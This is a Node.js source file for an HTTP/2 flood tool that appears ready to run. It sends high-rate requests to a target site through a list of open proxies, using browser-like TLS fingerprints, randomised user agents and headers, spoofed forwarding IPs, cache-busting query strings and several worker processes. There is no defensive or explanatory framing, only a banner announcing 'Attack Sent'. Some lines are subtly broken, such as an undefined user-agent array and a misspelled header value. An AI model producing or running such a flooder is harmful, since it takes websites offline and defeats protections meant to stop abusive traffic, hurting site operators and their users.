const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
require("colors");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};
if (!args.target || !args.time || !args.rate || !args.threads || !args.proxyFile) {
    console.log("node flood.js [target] [time] [rate] [threads] [proxyFile]".red);
    process.exit(0);
}
const proxies = fs.readFileSync(args.proxyFile, "utf8").split(/\r?\n/).filter(Boolean);
const parsed = url.parse(args.target);
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"].join(":");
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureContext = tls.createSecureContext({ ciphers, sigalgs, honorCipherOrder: true, secureOptions, secureProtocol: "TLS_method" });

const randstr = (len) => { let s = ""; const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
const randip = () => Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
const randAccept = () => [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
][Math.floor(Math.random() * 5)];
const randLang = () => ["en-US,en;q=0.9", "fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7", "de-DE,de;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8,zh;q=0.7", "zh-CN,zh;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][Math.floor(Math.random() * 6)];
const randEnc = () => ["gzip, deflate, br", "gzip, deflate", "identity", "br"][Math.floor(Math.random() * 4)];
const randCache = () => ["no-cache", "no-store", "max-age=0", "must-revalidate", "no-cache, no-store, must-revalidate"][Math.floor(Math.random() * 5)];
const randUA = () => {
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:" + Math.floor(Math.random() * 120) + ".0) Gecko/20100101 Firefox/" + Math.floor(Math.random() * 120) + ".0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:" + Math.floor(Math.random() * 120) + ".0) Gecko/20100101 Firefox/" + Math.floor(Math.random() * 120) + ".0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Edg/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + ".0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " OPR/" + Math.floor(Math.random() * 100) + ".0." + Math.floor(Math.random() * 9999) + ".0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36 Vivaldi/5." + Math.floor(Math.random() * 9) + ".0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36 Brave/1." + Math.floor(Math.random() * 99) + ".0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36 OPR/" + Math.floor(Math.random() * 100) + ".0." + Math.floor(Math.random() * 9999) + ".0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " YaBrowser/23." + Math.floor(Math.random() * 9) + ".0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:" + Math.floor(Math.random() * 120) + ".0) Gecko/20100101 Firefox/" + Math.floor(Math.random() * 120) + ".0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Safari/537.36 Edg/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + ".0",
        "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; RMX2202) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; V2049A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; CPH2173) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; KB2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; LE2123) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A905F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A908N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A9080) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * 120) + ".0." + Math.floor(Math.random() * 9999) + "." + Math.floor(Math.random() * 999) + " Mobile Safari/537.36"
    ];
    return uas[Math.floor(Math.random() * uas.length)];
};

class NetSocket {
    HTTP(proxy, callback) {
        const [host, port] = proxy.split(":");
        const payload = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const socket = net.connect({ host, port: ~~port });
        socket.setTimeout(10000);
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 60000);
        socket.once("connect", () => socket.write(payload));
        socket.once("data", () => callback(socket));
        socket.once("timeout", () => socket.destroy());
        socket.once("error", () => socket.destroy());
    }
}
const Socker = new NetSocket();

function runFlooder() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    Socker.HTTP(proxy, (connection) => {
        if (!connection) return;
        const tlsConn = tls.connect({
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: connection,
            ciphers,
            sigalgs,
            ecdhCurve,
            ALPNProtocols: ["h2"],
            secureContext,
            rejectUnauthorized: false,
            honorCipherOrder: false,
            secureOptions,
            secureProtocol: "TLS_method"
        });
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsed.href, {
            settings: {
                headerTableSize: 65536,
                maxHeaderListSize: 32768,
                initialWindowSize: 6291456,
                maxFrameSize: 16384
            },
            createConnection: () => tlsConn
        });
        client.setMaxListeners(0);

        client.on("connect", () => {
            for (let j = 0; j < args.rate; j++) {
                const path = parsed.path + "?" + randstr(8) + "=" + randstr(32) + "&" + randstr(8) + "=" + randstr(32) + "&" + randstr(8) + "=" + randstr(32);
                const headers = {
                    ":method": "GET",
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": path,
                    "user-agent": randUA(),
                    "accept": randAccept(),
                    "accept-language": randLang(),
                    "accept-encoding": randEnc(),
                    "cache-control": randCache(),
                    "pragma": "no-cache",
                    "upgrade-insecure-requests": "1",
                    "sec-ch-ua": `"${randstr(8)}";v="99", "${randstr(5)}";v="98", "${randstr(6)}";v="97"`,
                    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
                    "sec-ch-ua-platform": `"${["Windows","macOS","Linux","Android","iOS"][Math.floor(Math.random()*5)]}"`,
                    "sec-fetch-dest": ["document","iframe","image","script","style","worker"][Math.floor(Math.random()*6)],
                    "sec-fetch-mode": ["navigate","same-origin","no-cors","cors"][Math.floor(Math.random()*4)],
                    "sec-fetch-site": ["same-origin","sai me-site","cross-site","none"][Math.floor(Math.random()*4)],
                    "sec-fetch-user": "?1",
                    "x-forwarded-for": randip(),
                    "x-real-ip": randip(),
                    "dnt": "1",
                    "referer": "https://" + randstr(10) + ".com/" + randstr(8),
                    "cookie": randstr(8) + "=" + randstr(64) + "; " + randstr(8) + "=" + randstr(64),
                    "x-request-id": randstr(32),
                    "x-correlation-id": randstr(32),
                    "x-csrf-token": randstr(64),
                    "x-timestamp": Date.now().toString(),
                    "x-session-id": randstr(32),
                    "x-visitor-id": randstr(32),
                    "x-device-id": randstr(32),
                    "x-app-version": Math.floor(Math.random()*100) + "." + Math.floor(Math.random()*100) + "." + Math.floor(Math.random()*100),
                    "x-client-ip": randip(),
                    "x-cluster-client-ip": randip(),
                    "via": "1.1 google",
                    "forwarded": "for=" + randip() + ";proto=https"
                };
                const req = client.request(headers, { exclusive: true, weight: 256 });
                req.on("response", () => { req.close(); req.destroy(); });
                req.end();
            }
        });

        client.on("close", () => { client.destroy(); tlsConn.destroy(); connection.destroy(); });
        client.on("error", () => { client.destroy(); tlsConn.destroy(); connection.destroy(); });
    });
}

if (cluster.isMaster) {
    console.log("═══════════════════════════════════════".gray);
    console.log(" VuXuanKien1997 Attack Sent | High Rqs Per Seconds ".red.bold);
    console.log("═══════════════════════════════════════".gray);
    for (let i = 0; i < args.threads; i++) cluster.fork();
} else {
    setInterval(runFlooder);
}

setTimeout(() => process.exit(0), args.time * 1000);
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
